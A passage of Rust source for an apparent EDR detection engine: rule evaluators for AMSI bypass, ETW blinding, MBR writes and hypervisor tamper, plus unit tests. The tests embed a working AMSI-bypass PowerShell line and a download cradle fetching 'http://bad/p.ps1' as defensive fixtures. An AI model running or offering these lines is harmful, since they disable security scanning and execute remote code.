        syscall.clone()
    } else {
        rec.exe_path.clone()
    };
    let mut indicators = vec!["Sanctum:GhostHunt".to_string()];
    if !syscall.is_empty() {
        indicators.push(format!("Syscall:{syscall}"));
    }
    if let Some(a) = addr {
        indicators.push(format!("Address:0x{a:x}"));
    }
    if !hex_payload.is_empty() {
        indicators.push(format!("Payload:{hex_payload}"));
    }
    out.push(make_hit(
        rec,
        "SANCTUM-001",
        "EDR.Sanctum.DirectSyscallGhostHunt",
        "T1106",
        RuleSeverity::Critical,
        subject.clone(),
        format!("Sanctum detected direct/unbacked syscall via Ghost Hunting: {subject}"),
        indicators,
    ));
}

fn evaluate_sanctum_amsi_bypass(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let func = first_str_by_pointers(&rec.raw, &["/function_name"]);
    let addr = first_u64_by_pointers(&rec.raw, &["/offending_address"]);
    let subject = if !func.is_empty() && !rec.exe_path.is_empty() {
        format!("{} ({func})", rec.exe_path)
    } else if !func.is_empty() {
        func.clone()
    } else {
        rec.exe_path.clone()
    };
    let mut indicators = vec!["Sanctum:AmsiBypass".to_string()];
    if !func.is_empty() {
        indicators.push(format!("Function:{func}"));
    }
    if let Some(a) = addr {
        indicators.push(format!("OffendingAddress:0x{a:x}"));
    }
    out.push(make_hit(
        rec,
        "SANCTUM-002",
        "EDR.Sanctum.AmsiBypassDetected",
        "T1562.001",
        RuleSeverity::Critical,
        subject.clone(),
        format!("Sanctum detected kernel-verified AMSI bypass attempt: {subject}"),
        indicators,
    ));
}

fn evaluate_sanctum_hvci_block(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let drv = first_str_by_pointers(
        &rec.raw,
        &[
            "/driver/image",
            "/file/rawPath",
            "/file/abstractPath",
            "/driver_path",
        ],
    );
    let classif = first_str_by_pointers(&rec.raw, &["/driver/classification"]);
    let subject = if !drv.is_empty() {
        drv.clone()
    } else if let Some(d) = rec.details.as_deref().filter(|s| !s.is_empty()) {
        d.to_string()
    } else {
        rec.exe_path.clone()
    };
    let mut indicators = vec!["Sanctum:HvciBlock".to_string()];
    if !drv.is_empty() {
        indicators.push(format!("Driver:{drv}"));
    }
    if !classif.is_empty() {
        indicators.push(format!("Classification:{classif}"));
    }
    out.push(make_hit(
        rec,
        "SANCTUM-003",
        "EDR.Sanctum.HvciOrBlocklistDriverBlocked",
        "T1068",
        RuleSeverity::Critical,
        subject.clone(),
        format!("Sanctum kernel driver check blocked vulnerable or malicious driver: {subject}"),
        indicators,
    ));
}

fn evaluate_sanctum_etw_ti(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let is_suspicious = extract_bool_by_pointers(
        &rec.raw,
        &["/suspicious", "/data/EtwThreatIntelligence/suspicious"],
    );
    let is_remote = extract_bool_by_pointers(
        &rec.raw,
        &["/remote", "/data/EtwThreatIntelligence/remote"],
    );
    if !is_suspicious && !is_remote {
        return;
    }

    let func = first_str_by_pointers(
        &rec.raw,
        &["/function", "/data/EtwThreatIntelligence/function"],
    );
    let evt_name = first_str_by_pointers(
        &rec.raw,
        &["/event_name", "/data/EtwThreatIntelligence/event_name"],
    );
    let target_pid = first_u64_by_pointers(
        &rec.raw,
        &[
            "/target_pid",
            "/target/pid",
            "/data/EtwThreatIntelligence/target_pid",
        ],
    );

    let severity = if is_remote {
        RuleSeverity::Critical
    } else {
        RuleSeverity::High
    };
    let label = if !func.is_empty() {
        func.clone()
    } else if !evt_name.is_empty() {
        evt_name.clone()
    } else {
        "ETW:TI".to_string()
    };
    let subject = if !rec.exe_path.is_empty() {
        format!("{} ({label})", rec.exe_path)
    } else {
        label
    };
    let mut indicators = vec!["Sanctum:EtwThreatIntelligence".to_string()];
    if !func.is_empty() {
        indicators.push(format!("Function:{func}"));
    }
    if !evt_name.is_empty() {
        indicators.push(format!("EtwEvent:{evt_name}"));
    }
    if is_remote {
        indicators.push("RemoteOperation:true".to_string());
    }
    if let Some(tpid) = target_pid {
        indicators.push(format!("TargetPid:{tpid}"));
    }

    out.push(make_hit(
        rec,
        "SANCTUM-004",
        "EDR.Sanctum.EtwThreatIntelSuspiciousActivity",
        "T1055",
        severity,
        subject.clone(),
        format!("Sanctum ETW:TI flagged suspicious memory/injection API operation: {subject}"),
        indicators,
    ));
}

fn evaluate_sanctum_etw_blinding(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let subject = rec
        .details
        .clone()
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "SanctumETWThreatIntelligence".to_string());
    out.push(make_hit(
        rec,
        "SANCTUM-005",
        "EDR.Sanctum.EtwTiBlindingAttempt",
        "T1562.006",
        RuleSeverity::Critical,
        subject.clone(),
        format!("Sanctum PPL runner detected ETW Threat-Intelligence blinding attempt: {subject}"),
        vec!["Sanctum:EtwTiBlinding".to_string()],
    ));
}

fn evaluate_mbr_sector0(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let alert = first_str_by_pointers(&rec.raw, &["/mbrAlert"]);
    let sector = first_u64_by_pointers(&rec.raw, &["/sector"]);
    if rec.event_type == "LLE_DISK_RAW_WRITE_ACCESS" && sector != Some(0) && alert.is_empty() {
        return;
    }

    let disk = first_str_by_pointers(&rec.raw, &["/disk", "/path"]);
    let subject = if !rec.exe_path.is_empty() {
        rec.exe_path.clone()
    } else if !alert.is_empty() {
        alert.clone()
    } else if !disk.is_empty() {
        disk.clone()
    } else if let Some(d) = rec.details.as_deref().filter(|s| !s.is_empty()) {
        d.to_string()
    } else {
        "PhysicalDrive0".to_string()
    };

    let mut indicators = vec!["MbrFilter:Sector0Write".to_string()];
    if !disk.is_empty() {
        indicators.push(format!("Disk:{disk}"));
    }
    if !alert.is_empty() {
        indicators.push(format!("Alert:{alert}"));
    }

    out.push(make_hit(
        rec,
        "MBR-001",
        "EDR.Ransomware.MbrSector0RawWrite",
        "T1561.002",
        RuleSeverity::Critical,
        subject.clone(),
        format!("MBRFilter intercepted direct Sector 0 MBR write attempt: {subject}"),
        indicators,
    ));
}

fn is_critical_syscall_msr(msr: u64) -> bool {
    matches!(msr, 0x176 | 0xC000_0080 | 0xC000_0082 | 0xC000_0083)
}

fn evaluate_hypervisor(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    if rec.event_type == "MLE_HYPERVISOR_MSR_TAMPER" {
        let msr = first_u64_by_pointers(&rec.raw, &["/targetMsr", "/owlyHv/context"]).unwrap_or(0);
        let subject = if !rec.exe_path.is_empty() {
            format!("{} (MSR 0x{msr:x})", rec.exe_path)
        } else {
            format!("MSR 0x{msr:x}")
        };
        out.push(make_hit(
            rec,
            "HV-001",
            "EDR.Hypervisor.SyscallMsrTamper",
            "T1014",
            RuleSeverity::Critical,
            subject.clone(),
            format!("Hypervisor detected unauthorized syscall MSR / EFER tamper: {subject}"),
            vec![
                "Hypervisor:WRMSR".to_string(),
                format!("TargetMsr:0x{msr:x}"),
            ],
        ));
        return;
    }

    let hv_ts = first_u64_by_pointers(&rec.raw, &["/owlyHv/timestamp"]).unwrap_or(0);
    if hv_ts == 0 || rec.pid <= 4 {
        return;
    }

    let evt_type = first_u64_by_pointers(&rec.raw, &["/owlyHook/eventType", "/owlyHookEventType"])
        .unwrap_or(0);
    let ctx = first_u64_by_pointers(&rec.raw, &["/owlyHv/context"]).unwrap_or(0);

    if evt_type == 65 && is_critical_syscall_msr(ctx) {
        let subject = if !rec.exe_path.is_empty() {
            format!("{} (MSR 0x{ctx:x})", rec.exe_path)
        } else {
            format!("PID {} (MSR 0x{ctx:x})", rec.pid)
        };
        out.push(make_hit(
            rec,
            "HV-001",
            "EDR.Hypervisor.SyscallMsrTamper",
            "T1014",
            RuleSeverity::Critical,
            subject.clone(),
            format!("Hypervisor trapped syscall MSR / EFER write outside System context: {subject}"),
            vec![
                "Hypervisor:WRMSR".to_string(),
                format!("TargetMsr:0x{ctx:x}"),
            ],
        ));
    } else if evt_type == 0x10 || (0x90..=0x94).contains(&evt_type) {
        let addr = first_u64_by_pointers(&rec.raw, &["/owlyHv/memoryAddress"]).unwrap_or(0);
        let subject = if !rec.exe_path.is_empty() {
            format!("{} (0x{addr:x})", rec.exe_path)
        } else {
            format!("PID {} (0x{addr:x})", rec.pid)
        };
        out.push(make_hit(
            rec,
            "HV-002",
            "EDR.Hypervisor.EptOrHiddenHookAlert",
            "T1014",
            RuleSeverity::High,
            subject.clone(),
            format!("Hypervisor detected EPT violation or hidden hook event: {subject}"),
            vec![
                format!("HypervisorEvent:0x{evt_type:x}"),
                format!("Context:0x{ctx:x}"),
                format!("MemoryAddress:0x{addr:x}"),
            ],
        ));
    }
}

/// Pure evaluation of a structured telemetry record against real-time EDR rules.
pub fn evaluate_event(rec: &EdrEventRecord) -> Vec<EdrRuleHit> {
    let mut hits = Vec::new();
    match rec.event_type.as_str() {
        "SCRIPT_BLOCK_ACTIVITY" => evaluate_powershell(rec, &mut hits),
        "PROCESS_TAMPERING" => evaluate_process_tampering(rec, &mut hits),
        "SHADOW_COPY_DELETE" | "VSS_SHADOW_COPY_DELETED" => {
            let subj = rec
                .details
                .clone()
                .unwrap_or_else(|| rec.exe_path.clone());
            hits.push(make_hit(
                rec,
                "VSS-001",
                "EDR.Ransomware.ShadowCopyDeletion",
                "T1490",
                RuleSeverity::Critical,
                subj,
                "Volume Shadow Copy deletion or manipulation detected".to_string(),
                vec!["ShadowCopyDelete".to_string()],
            ));
        }
        "WMI_EVENT_CONSUMER"
        | "WMI_EVENT_BINDING"
        | "WMI_EVENT_CONSUMER_TO_FILTER"
        | "WMI_EVENT_FILTER" => evaluate_wmi(rec, &mut hits),
        "BITS_JOB_ACTIVITY" => evaluate_bits(rec, &mut hits),
        "SCHEDULED_TASK_CREATE" | "SCHEDULED_TASK_MODIFY" => evaluate_scheduled_task(rec, &mut hits),
        "SERVICE_CREATE" | "SERVICE_MODIFY" => evaluate_service(rec, &mut hits),
        "DRIVER_LOADED" | "LLE_DRIVER_LOAD" | "DRIVER_MODIFIED" | "DRIVER_UNLOADED" => {
            evaluate_driver(rec, &mut hits)
        }
        "LLE_NAMED_PIPE_SERVER_CREATE" | "LLE_NAMED_PIPE_CREATE" => {
            evaluate_named_pipe(rec, &mut hits)
        }
        "LLE_REMOTE_THREAD_CREATE" => evaluate_remote_thread(rec, &mut hits),
        "LLE_IMAGE_LOAD" => evaluate_image_load(rec, &mut hits),
        "FILE_DOWNLOADED" => evaluate_file_downloaded(rec, &mut hits),
        "VIRTUAL_DISK_MOUNT" => evaluate_virtual_disk_mount(rec, &mut hits),
        "LOCAL_GROUP_MEMBER_ADD" | "LOCAL_ACCOUNT_CREATE" | "LOCAL_ACCOUNT_MODIFY" => {
            evaluate_account_or_group(rec, &mut hits)
        }
        "GROUP_POLICY_MODIFY" => evaluate_group_policy(rec, &mut hits),
        "SANCTUM_GHOST_HUNT" => evaluate_sanctum_ghost_hunt(rec, &mut hits),
        "SANCTUM_AMSI_BYPASS" => evaluate_sanctum_amsi_bypass(rec, &mut hits),
        "SANCTUM_HVCI_BLOCK" => evaluate_sanctum_hvci_block(rec, &mut hits),
        "SANCTUM_ETW_TI" => evaluate_sanctum_etw_ti(rec, &mut hits),
        "SANCTUM_ETW_BLINDING" => evaluate_sanctum_etw_blinding(rec, &mut hits),
        "MBR_SECTOR0_RAW_WRITE" | "LLE_DISK_RAW_WRITE_ACCESS" => evaluate_mbr_sector0(rec, &mut hits),
        "MLE_HYPERVISOR_MSR_TAMPER" | "LLE_DEVICE_IOCTL" => evaluate_hypervisor(rec, &mut hits),
        _ => {}
    }
    hits
}

/// Pure evaluation of a network flow record (malicious TLS JA3/JA3S signatures).
pub fn evaluate_flow(flow: &NetworkFlowRecord) -> Vec<EdrRuleHit> {
    let mut hits = Vec::new();
    for (kind, val_opt) in [("JA3", flow.ja3.as_deref()), ("JA3S", flow.ja3s.as_deref())] {
        let Some(hash) = val_opt else { continue };
        let Some(family) = lookup_malicious_tls_fingerprint(hash) else {
            continue;
        };
        let target = format!("{}:{}", flow.dst_ip, flow.dst_port);
        hits.push(EdrRuleHit {
            rule_id: "TLS-001",
            rule_name: "EDR.Network.MaliciousTlsFingerprint",
            mitre: "T1071.001",
            severity: RuleSeverity::High,
            event_type: "NETWORK_TLS_FINGERPRINT".to_string(),
            pid: flow.pid,
            process_name: flow.process_name.clone(),
            exe_path: flow.process_name.clone(),
            sha256: String::new(),
            subject: target.clone(),
            summary: format!("Matched malicious {kind} fingerprint ({family}) toward {target}"),
            indicators: vec![
                format!("{kind}:{hash}"),
                format!("Family:{family}"),
                format!("Remote:{target}"),
                "MITRE:T1071.001".to_string(),
                "RuleId:TLS-001".to_string(),
            ],
        });
    }
    hits
}

fn should_emit_dedup(hit: &EdrRuleHit) -> bool {
    let hub = ALERT_DEDUP.get_or_init(|| Mutex::new(HashMap::new()));
    let Ok(mut map) = hub.lock() else {
        return true;
    };
    let now = Instant::now();
    if map.len() >= DEDUP_MAX_ENTRIES {
        map.retain(|_, ts| now.duration_since(*ts) < DEDUP_WINDOW);
        if map.len() >= DEDUP_MAX_ENTRIES {
            map.clear();
        }
    }
    let key = (
        hit.rule_id.to_string(),
        hit.pid,
        hit.subject.to_ascii_lowercase(),
    );
    if let Some(prev) = map.get(&key) {
        if now.duration_since(*prev) < DEDUP_WINDOW {
            return false;
        }
    }
    map.insert(key, now);
    true
}

fn dispatch_hits(hits: Vec<EdrRuleHit>, context_details: serde_json::Value) {
    if hits.is_empty() {
        return;
    }
    let now_ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let machine_id = get_machine_guid();

    for hit in hits {
        if !should_emit_dedup(&hit) {
            continue;
        }
        let log_line = format!(
            "[EDR Rule] {} [{}] (pid={} proc={}): {}",
            hit.rule_name, hit.mitre, hit.pid, hit.process_name, hit.summary
        );
        match hit.severity {
            RuleSeverity::Critical | RuleSeverity::High => Logging::alert(&log_line),
            RuleSeverity::Medium => Logging::warning(&log_line),
        }

        if matches!(hit.severity, RuleSeverity::Critical | RuleSeverity::High) {
            let title = format!("{} [{}]", hit.rule_name, hit.mitre);
            let _ = send_threat_alert(&title, &hit.subject, false);
        }

        let payload = BehaviorTelemetryPayload {
            machine_id: machine_id.clone(),
            timestamp: now_ts,
            pid: hit.pid,
            gid: hit.pid as u64,
            process_name: if hit.process_name.is_empty() {
                "unknown".to_string()
            } else {
                hit.process_name.clone()
            },
            exe_path: hit.exe_path.clone(),
            command_line: hit.summary.clone(),
            sha256: hit.sha256.clone(),
            parent_pid: None,
            parent_name: None,
            detection: hit.rule_name.to_string(),
            source: "edr_telemetry_rule".to_string(),
            risk_score: hit.severity.risk_score(),
            indicators: hit.indicators.clone(),
            ops_summary: None,
            details: serde_json::json!({
                "rule_id": hit.rule_id,
                "mitre": hit.mitre,
                "severity": hit.severity.as_str(),
                "event_type": hit.event_type,
                "subject": hit.subject,
                "context": context_details,
            }),
        };
        stream_behavior_telemetry_async(payload, None);
    }
}

/// Evaluates an enriched raw telemetry record and asynchronously dispatches alerts on hit.
pub fn evaluate_and_dispatch_event(rec: &EdrEventRecord) {
    let hits = evaluate_event(rec);
    if hits.iter().any(|h| h.rule_id.starts_with("SANCTUM-")) && rec.pid > 4 {
        record_sanctum_detection(rec.pid);
    }
    if !hits.is_empty() {
        dispatch_hits(hits, rec.raw.clone());
    }
}

/// Evaluates a network flow record and asynchronously dispatches alerts on hit.
pub fn evaluate_and_dispatch_flow(flow: &NetworkFlowRecord) {
    let hits = evaluate_flow(flow);
    if !hits.is_empty() {
        let ctx = serde_json::json!({
            "src_ip": flow.src_ip,
            "src_port": flow.src_port,
            "dst_ip": flow.dst_ip,
            "dst_port": flow.dst_port,
            "protocol": flow.protocol,
            "hostname": flow.hostname,
            "ja3": flow.ja3,
            "ja3s": flow.ja3s,
        });
        dispatch_hits(hits, ctx);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn sample_event(event_type: &str, exe_path: &str, details: Option<&str>, raw: Value) -> EdrEventRecord {
        let proc_name = exe_path
            .rsplit(['\\', '/'])
            .next()
            .unwrap_or("")
            .to_string();
        EdrEventRecord {
            timestamp: 1_700_000_000,
            time_iso: "2026-01-01T00:00:00Z".to_string(),
            event_type: event_type.to_string(),
            pid: 4242,
            process_name: proc_name,
            exe_path: exe_path.to_string(),
            details: details.map(str::to_string),
            raw,
        }
    }

    fn sample_flow(ja3: Option<&str>, ja3s: Option<&str>) -> NetworkFlowRecord {
        NetworkFlowRecord {
            timestamp: 1_700_000_000,
            pid: 4242,
            process_name: "beacon.exe".to_string(),
            src_ip: "10.0.0.10".to_string(),
            src_port: 51234,
            dst_ip: "198.51.100.42".to_string(),
            dst_port: 443,
            protocol: "Tcp".to_string(),
            hostname: Some("c2.example".to_string()),
            dns_query: None,
            url: None,
            http_method: None,
            ja3: ja3.map(str::to_string),
            ja3s: ja3s.map(str::to_string),
        }
    }

    #[test]
    fn powershell_scriptblock_detects_amsi_and_cradle_without_benign_fp() {
        let amsi = sample_event(
            "SCRIPT_BLOCK_ACTIVITY",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            None,
            json!({
                "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
            }),
        );
        let hits = evaluate_event(&amsi);
        assert!(hits.iter().any(|h| h.rule_name == "EDR.PowerShell.AmsiOrEtwBypass"));

        let cradle = sample_event(
            "SCRIPT_BLOCK_ACTIVITY",
            "powershell.exe",
            None,
            json!({
                "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://bad/p.ps1')"
            }),
        );
        let cradle_hits = evaluate_event(&cradle);
        assert!(cradle_hits
            .iter()
            .any(|h| h.rule_name == "EDR.PowerShell.DownloadCradleExec"));

        let benign = sample_event(
            "SCRIPT_BLOCK_ACTIVITY",
            "powershell.exe",
            None,
            json!({
                "ScriptBlockText": "Get-Process iexplorer | Select-Object Name, Id"
            }),
        );
        assert!(evaluate_event(&benign).is_empty());
    }

    #[test]
    fn process_tampering_shadow_delete_and_byovd_driver_trigger() {
        let tamper = sample_event(
            "PROCESS_TAMPERING",
            r"C:\Users\alice\AppData\Local\Temp\svchost.exe",
            None,
            json!({
                "technique": "process_hollowing",
                "reason": "PE header entry point mismatch"
            }),
        );
        assert_eq!(evaluate_event(&tamper).len(), 1);
        assert_eq!(evaluate_event(&tamper)[0].severity, RuleSeverity::Critical);

        let vss = sample_event(
            "SHADOW_COPY_DELETE",
            r"C:\Windows\System32\vssadmin.exe",
            Some("Shadow Copy deleted"),
            json!({}),
        );
        assert!(evaluate_event(&vss)
            .iter()
            .any(|h| h.rule_name == "EDR.Ransomware.ShadowCopyDeletion"));

        let byovd = sample_event(
            "LLE_DRIVER_LOAD",
            "System",
            None,
            json!({ "file": { "rawPath": r"\SystemRoot\System32\drivers\iqvw64e.sys" } }),
        );
        assert!(evaluate_event(&byovd)
            .iter()
            .any(|h| h.rule_name == "EDR.Driver.BYOVDVulnerableLoaded"));

        let benign_drv = sample_event(
            "LLE_DRIVER_LOAD",
            "System",
            None,
            json!({ "file": { "rawPath": r"\SystemRoot\System32\drivers\ntfs.sys" } }),
        );
        assert!(evaluate_event(&benign_drv).is_empty());
    }

    #[test]
    fn named_pipe_remote_thread_dll_sideload_and_motw_rules() {
        let c2_pipe = sample_event(
            "LLE_NAMED_PIPE_SERVER_CREATE",
            r"C:\Users\alice\beacon.exe",
            None,
            json!({ "file": { "rawPath": r"\Device\NamedPipe\msagent_8f2a" } }),
        );
        assert!(evaluate_event(&c2_pipe)
            .iter()
            .any(|h| h.rule_name == "EDR.NamedPipe.KnownMaliciousC2OrExploit"));

        let benign_pipe = sample_event(
            "LLE_NAMED_PIPE_SERVER_CREATE",
            r"C:\Program Files\App\app.exe",
            None,
            json!({ "file": { "rawPath": r"\Device\NamedPipe\mojo.1234.5678" } }),
        );
        assert!(evaluate_event(&benign_pipe).is_empty());

        let inj = sample_event(
            "LLE_REMOTE_THREAD_CREATE",
            r"C:\Users\alice\Downloads\dropper.exe",
            None,
            json!({
                "target": {
                    "pid": 780,
                    "imageFile": { "path": r"C:\Windows\System32\lsass.exe" }
                }
            }),
        );
        assert!(evaluate_event(&inj)
            .iter()
            .any(|h| h.rule_name == "EDR.RemoteThread.SuspiciousInjection"));

        let sideload = sample_event(
            "LLE_IMAGE_LOAD",
            r"C:\Windows\System32\rundll32.exe",
            None,
            json!({ "file": { "rawPath": r"C:\Users\alice\AppData\Local\Temp\evil.dll" } }),
        );
        assert!(evaluate_event(&sideload)
            .iter()
            .any(|h| h.rule_name == "EDR.ImageLoad.SuspiciousDllSideload"));

        let motw_iso = sample_event(
            "FILE_DOWNLOADED",
            r"C:\Users\alice\Downloads\invoice.iso",
            None,
            json!({
                "url": "https://cdn.example.invalid/invoice.iso?v=1",
                "target_path": r"C:\Users\alice\Downloads\invoice.iso"
            }),
        );
        let motw_hits = evaluate_event(&motw_iso);
        assert_eq!(motw_hits[0].severity, RuleSeverity::Medium);

        let double_ext = sample_event(
            "FILE_DOWNLOADED",
            r"C:\Users\alice\Downloads\report.pdf.exe",
            None,
            json!({
                "url": "https://cdn.example.invalid/report.pdf.exe",
                "target_path": r"C:\Users\alice\Downloads\report.pdf.exe"
            }),
        );
        let double_hits = evaluate_event(&double_ext);
        assert_eq!(double_hits[0].severity, RuleSeverity::High);
    }

    #[test]
    fn malicious_ja3_and_ja3s_trigger_while_benign_tls_is_clean() {
        let cs = sample_flow(
            Some("eb88d0b3e1961a0562f006e5ce2a0b87"),
            Some("ae4edc6faf64d08308082ad26be60767"),
        );
        let hits = evaluate_flow(&cs);
        assert_eq!(hits.len(), 2);
        assert_eq!(hits[0].rule_name, "EDR.Network.MaliciousTlsFingerprint");

        let benign = sample_flow(
            Some("0123456789abcdef0123456789abcdef"),
            Some("fedcba9876543210fedcba9876543210"),
        );
        assert!(evaluate_flow(&benign).is_empty());
    }

    #[test]
    fn sanctum_telemetry_rules_and_sdk_condition_work_end_to_end() {
        use crate::firewall::engine::{PacketInfo, Protocol};
        use crate::firewall::sdk::RuleCondition;
        use std::net::{IpAddr, Ipv4Addr};

        let ghost = sample_event(
            "SANCTUM_GHOST_HUNT",
            r"C:\Temp\loader.exe",
            None,
            json!({
                "pid": 4242,
                "syscall_name": "NtAllocateVirtualMemory",
                "address": 140735275417600u64,
                "hex_payload": "4c8bd1b818000000"
            }),
        );
        let ghost_hits = evaluate_event(&ghost);
        assert_eq!(ghost_hits.len(), 1);
        assert_eq!(ghost_hits[0].rule_name, "EDR.Sanctum.DirectSyscallGhostHunt");
        assert_eq!(ghost_hits[0].severity, RuleSeverity::Critical);

        let amsi = sample_event(
            "SANCTUM_AMSI_BYPASS",
            r"C:\Temp\ps_bypass.exe",
            None,
            json!({
                "pid": 4242,
                "function_name": "AmsiScanBuffer",
                "offending_address": 140711111111111u64
            }),
        );
        let amsi_hits = evaluate_event(&amsi);
        assert_eq!(amsi_hits.len(), 1);
        assert_eq!(amsi_hits[0].rule_name, "EDR.Sanctum.AmsiBypassDetected");
        assert_eq!(amsi_hits[0].severity, RuleSeverity::Critical);

        let hvci_direct = sample_event(
            "SANCTUM_HVCI_BLOCK",
            r"C:\Temp\dropper.exe",
            None,
            json!({
                "driver": {
                    "image": r"\SystemRoot\System32\drivers\iqvw64e.sys",
                    "classification": "BYOVD",
                    "action": "BLOCK"
                }
            }),
        );
        let hvci_hits = evaluate_event(&hvci_direct);
        assert_eq!(hvci_hits.len(), 1);
        assert_eq!(hvci_hits[0].rule_name, "EDR.Sanctum.HvciOrBlocklistDriverBlocked");
        assert_eq!(hvci_hits[0].severity, RuleSeverity::Critical);

        let hvci_lle = sample_event(
            "LLE_DRIVER_LOAD",
            r"C:\Temp\dropper.exe",
            None,
            json!({
                "subType": "HVCI_BLOCK",
                "file": { "rawPath": r"\SystemRoot\System32\drivers\rtcore64.sys" },
                "driver": { "image": r"\SystemRoot\System32\drivers\rtcore64.sys", "action": "BLOCK" }
            }),
        );
        let hvci_lle_hits = evaluate_event(&hvci_lle);
        assert_eq!(hvci_lle_hits.len(), 1);
        assert_eq!(hvci_lle_hits[0].rule_name, "EDR.Sanctum.HvciOrBlocklistDriverBlocked");
        assert_eq!(hvci_lle_hits[0].severity, RuleSeverity::Critical);

        let blinding = sample_event(
            "SANCTUM_ETW_BLINDING",
            "sanctum_ppl_runner.exe",
            Some("ETW:TI trace session was interrupted"),
            json!({}),
        );
        let blind_hits = evaluate_event(&blinding);
        assert_eq!(blind_hits.len(), 1);
        assert_eq!(blind_hits[0].rule_name, "EDR.Sanctum.EtwTiBlindingAttempt");
        assert_eq!(blind_hits[0].severity, RuleSeverity::Critical);

        let unloaded = sample_event(
            "DRIVER_UNLOADED",
            "System",
            None,
            json!({ "driver_path": r"\SystemRoot\System32\drivers\sanctum.sys" }),
        );
        let unloaded_hits = evaluate_event(&unloaded);
        assert_eq!(unloaded_hits.len(), 1);
        assert_eq!(unloaded_hits[0].rule_name, "EDR.Driver.SecurityDriverUnloaded");
        assert_eq!(unloaded_hits[0].severity, RuleSeverity::Critical);

        let ti_remote = sample_event(
            "SANCTUM_ETW_TI",
            r"C:\Temp\injector.exe",
            None,
            json!({
                "function": "NtAllocateVirtualMemory",
                "event_name": "ALLOCVM_REMOTE",
                "remote": true,
                "suspicious": true,
                "target_pid": 780
            }),
        );
        let ti_remote_hits = evaluate_event(&ti_remote);
        assert_eq!(ti_remote_hits.len(), 1);
        assert_eq!(ti_remote_hits[0].severity, RuleSeverity::Critical);

        let ti_nested_susp = sample_event(
            "SANCTUM_ETW_TI",
            r"C:\Temp\shellcode.exe",
            None,
            json!({
                "data": {
                    "EtwThreatIntelligence": {
                        "function": "NtProtectVirtualMemory",
                        "event_name": "PROTECTVM_LOCAL",
                        "remote": false,
                        "suspicious": true
                    }
                }
            }),
        );
        let ti_nested_hits = evaluate_event(&ti_nested_susp);
        assert_eq!(ti_nested_hits.len(), 1);
        assert_eq!(ti_nested_hits[0].severity, RuleSeverity::High);

        let ti_benign = sample_event(
            "SANCTUM_ETW_TI",
            r"C:\Windows\System32\svchost.exe",
            None,
            json!({
                "data": {
                    "EtwThreatIntelligence": {
                        "function": "NtAllocateVirtualMemory",
                        "event_name": "ALLOCVM_LOCAL",
                        "remote": false,
                        "suspicious": false
                    }
                }
            }),
        );
        assert!(evaluate_event(&ti_benign).is_empty());

        let test_pid = 87654321u32;
        let pkt = PacketInfo {
            timestamp: 1_700_000_000,
            protocol: Protocol::TCP,
            ip_proto: 6,
            src_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 5)),
            dst_ip: IpAddr::V4(Ipv4Addr::new(198, 51, 100, 9)),
            src_port: 50000,
            dst_port: 443,
            size: 128,
            outbound: true,
            process_id: test_pid,
            dns_query: None,
            hostname: None,
            full_url: None,
            tls_handshake: false,
            http_method: None,
            http_path: None,
            http_user_agent: None,
            http_content_type: None,
            http_referer: None,
            payload_entropy: None,
            payload_sample: None,
            payload_urls: Vec::new(),
            payload_domains: Vec::new(),
            image_path: String::new(),
            detected_file_type: None,
            http_request_body: None,
            http_response_body: None,
            tcp_flags: None,
            ja3: None,
            ja3s: None,
        };
        assert!(!RuleCondition::SanctumDetected.matches(&pkt, &[]));
        record_sanctum_detection(test_pid);
        assert!(RuleCondition::SanctumDetected.matches(&pkt, &[]));

        let vss_etw = sample_event(
            "VSS_SHADOW_COPY_DELETED",
            r"C:\Windows\System32\vssvc.exe",
            Some("VolumeName=C:"),
            json!({ "VolumeName": "C:" }),
        );
        assert_eq!(evaluate_event(&vss_etw).len(), 1);
        assert_eq!(
            evaluate_event(&vss_etw)[0].rule_name,
            "EDR.Ransomware.ShadowCopyDeletion"
        );

        let wmi_bind = sample_event(
            "WMI_EVENT_CONSUMER_TO_FILTER",
            r"C:\Windows\System32\wbem\wmiprvse.exe",
            None,
            json!({ "Operation": "__FilterToConsumerBinding", "consumer": "powershell.exe -enc AAAA" }),
        );
        assert_eq!(evaluate_event(&wmi_bind).len(), 1);
        assert_eq!(
            evaluate_event(&wmi_bind)[0].rule_name,
            "EDR.WMI.SuspiciousPermanentConsumer"
        );

        let vhd_etw = sample_event(
            "VIRTUAL_DISK_MOUNT",
            r"C:\Windows\System32\svchost.exe",
            None,
            json!({ "VhdFileName": r"C:\Users\alice\Downloads\payload.iso" }),
        );
        assert_eq!(evaluate_event(&vhd_etw).len(), 1);
        assert_eq!(evaluate_event(&vhd_etw)[0].rule_name, "EDR.VirtualDisk.MotwBypassMount");

        let priv_4732 = sample_event(
            "LOCAL_ACCOUNT_MODIFY",
            r"C:\Windows\System32\net.exe",
            Some("Security EventID=4732"),
            json!({ "event_id": 4732, "TargetUserName": "Administrators" }),
        );
        assert_eq!(evaluate_event(&priv_4732).len(), 1);
        assert_eq!(
            evaluate_event(&priv_4732)[0].rule_name,
            "EDR.Account.PrivilegedGroupAddition"
        );

        let benign_4738 = sample_event(
            "LOCAL_ACCOUNT_MODIFY",
            r"C:\Windows\System32\lsass.exe",
            Some("Security EventID=4738"),
            json!({ "event_id": 4738, "TargetUserName": "alice" }),
        );
        assert!(evaluate_event(&benign_4738).is_empty());
    }

    #[test]
    fn mbrfilter_and_hypervisor_rules_and_driver_tamper_work() {
        let mbr_ev = sample_event(
            "MBR_SECTOR0_RAW_WRITE",
            r"C:\Temp\wiper.exe",
            Some("MBR Sector 0 raw write blocked"),
            json!({ "disk": r"\\.\PhysicalDrive0", "sector": 0, "mbrAlert": r"DISK:0|C:\Temp\wiper.exe" }),
        );
        let mbr_hits = evaluate_event(&mbr_ev);
